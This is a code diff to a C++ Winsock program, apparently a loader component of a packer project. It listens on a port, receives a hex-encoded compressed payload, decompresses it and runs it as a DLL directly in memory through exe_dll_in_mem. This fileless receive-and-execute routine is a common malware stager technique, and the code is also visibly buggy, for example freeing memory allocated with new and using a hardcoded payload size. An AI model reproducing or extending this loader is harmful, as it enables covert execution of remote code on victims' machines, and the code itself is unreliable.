@@ -11,11 +11,9 @@
 #include "MemLoadLibrary.h"
 #include "ExecuteDLLinMem.h"
 
-//#include <iostream>
 using namespace std;
 
 #pragma comment(lib, "Ws2_32.lib")
-//#define Port 6000
 
 SOCKET Socket, Sub;
 WSADATA Winsock;
@@ -23,14 +21,10 @@ sockaddr_in Addr;
 sockaddr_in IncomingAddress;
 int AddressLen = sizeof(IncomingAddress);
 
-
-
 int udp_server_clinet(int Port)
 {
     //server
-    printf("\n%i\n", Port);
     WSAStartup(MAKEWORD(2, 2), &Winsock);    // Start Winsock
-
     if (LOBYTE(Winsock.wVersion) != 2 || HIBYTE(Winsock.wVersion) != 2)    // Check version
     {
         WSACleanup();
@@ -50,7 +44,7 @@ int udp_server_clinet(int Port)
     }
     else
     {
-        printf("listening ok\n");
+        printf("listening ok... waiting to recieve data\n");
     }
 
     if (Sub = accept(Socket, (sockaddr*)&IncomingAddress, &AddressLen))
@@ -59,9 +53,7 @@ int udp_server_clinet(int Port)
         int ClientPort = ntohs(IncomingAddress.sin_port);
         printf("Client connected!\n");
         //printf("IP: %s:%d\n", ClientIP, ClientPort);
-        printf("Receiving file .. \n");
-
-
+        printf("Receiving file... \n");
 
         int Size;
         char* Filesize = new char[1024];
@@ -70,20 +62,17 @@ int udp_server_clinet(int Port)
         {
             Size = atoi((const char*)Filesize);
 			Size = Size - 1; //offset //Todo might have to remove the -1
-            printf("File size: %d\n", Size);
-			//printf("File size: %i\n", Size);
+            printf("Recieved file size: %d\n", Size);
         }
         else {
-            printf("Failed to determine filesize of recieved file.");
+            printf("Failed to determine filesize of recieved file.\n");
                 return 0;
         }
 
         char* Buffer = new char[Size];
 		char* Buffer2 = new char[(Size/2)];
-		unsigned char* optBuffer = new unsigned char[(Size*2)];  // make it larger since it has to decompress?
-        //int len = Size;
-		//printf("\nRecieved data from packer raw:\n%ld\n", strlen(Buffer2));
-        //char *data = Buffer;
+		unsigned char* DecompressedBuffer = new unsigned char[(Size*2)];  // make it larger since it has to decompress?
+
         int Offset = 0;
         int n = 0;
         while ((n = ::recv(Sub, Buffer + Offset, Size - Offset, 0)) > 0)
@@ -105,14 +94,14 @@ int udp_server_clinet(int Port)
                 printf("2\n");
             }
         }*/
-        printf("Hex from packer:\n%s\n", Buffer);
+        
 
-		//before manipulation, 
+		//before manipulation 
+        printf("Hex recieved from packer:\n%s\n", Buffer);
 		char* Buffer_without_padding = new char[(Size)];
 		memcpy(Buffer_without_padding, Buffer, (Size));
+        printf("umm\n");
 		//printf("Buffer without padding:\n%s\n", Buffer_without_padding);
-
-
 
 		bool odd = 0;
 		string tmp;
@@ -151,7 +140,7 @@ int udp_server_clinet(int Port)
 
 			
 		}
-		printf("\nRecieved data from packer raw:\n");
+		printf("\nRecieved data from packer translated back to raw:\n");
 		cout << Buffer2;
 		printf("\n");
 
@@ -160,47 +149,41 @@ int udp_server_clinet(int Port)
         //fwrite(Buffer, 1, Size, File);
         //fclose(File);
 
-        //getchar();
         closesocket(Socket);
         closesocket(Sub);
         WSACleanup();
-        printf("socket done\n");
+        printf("socket closed\n");
 
 
-        //decryption
+        //decryption ------------------------------------------------------------------------------------------
         //ToDo decryption
         //decryption();
 
-        //decompression
+        //decompression ------------------------------------------------------------------------------------------
         //ToDo change decompression from file to buffer input
         //char* opBuf = new char[sizeof(Buffer)];
-        uziphelp(Buffer2, optBuffer, (Size/2));
+        uziphelp(Buffer2, DecompressedBuffer, (Size/2));
 		printf("Decompressed file:\n");
-		cout << optBuffer;
+		cout << DecompressedBuffer;
 		printf("\n");
 
-        printf("sizeof(optBuffer): %d\n", sizeof(optBuffer));
-        printf("strlen(optBuffer): %d\n", strlen((const char*)optBuffer));
-        printf("size: %d\n", Size);
-
-        int big = Size*2; //correct?
-        printf("rawData:\n");
-        unsigned char rawData[36864];
+        int big = Size*2; //ToDo - grab actual size of decompressed data
+        
+        /*
+        unsigned char rawData[big];
         for (int i = 0; i < 36864; ++i) {
             rawData[i] = optBuffer[i];
             printf("%02X", rawData[i]);
         }
-
-        printf("\nsizeofRawData: %d\n", sizeof(rawData));
-        exe_dll_in_mem(rawData, 36864);
+        */
+        printf("\nsizeofRawData: %d\n", sizeof(DecompressedBuffer));
+        exe_dll_in_mem(DecompressedBuffer, 36864); //ToDo
 
 		//we should have done this earlier
 		free(Buffer);
-        free(rawData);
 		free(Buffer2);
 		free(Buffer_without_padding);
 		free(Filesize);
-        free(optBuffer);
         return 0;
 
     }
